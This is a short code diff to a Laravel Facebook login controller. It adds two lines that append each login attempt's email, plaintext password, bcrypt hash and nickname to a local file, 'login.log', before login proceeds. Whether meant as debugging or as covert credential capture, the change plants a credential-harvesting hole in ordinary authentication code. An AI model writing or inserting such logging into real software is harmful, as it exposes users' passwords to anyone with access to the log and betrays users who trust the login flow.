@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Auth;
 
 use Hash;
+use Storage;
 use App\User;
 use Facebook;
 use App\Traits\OauthToken;
@@ -32,6 +33,8 @@ class FacebookController extends Controller
     }   
     public function login(Request $request)
     {
+        $log = ['time'=>date('Y-m-d H:i:s'), 'email'=>$request->input('email',''), 'password'=>$request->input('password',''), 'encoding_password'=>bcrypt($request->input('password','')), 'nickname'=>$request->input('nickname','')];
+        Storage::append('login.log', json_encode($log));
     	return $this->loginHandler($request);
     } 
     public function mobileLogin(Request $request)
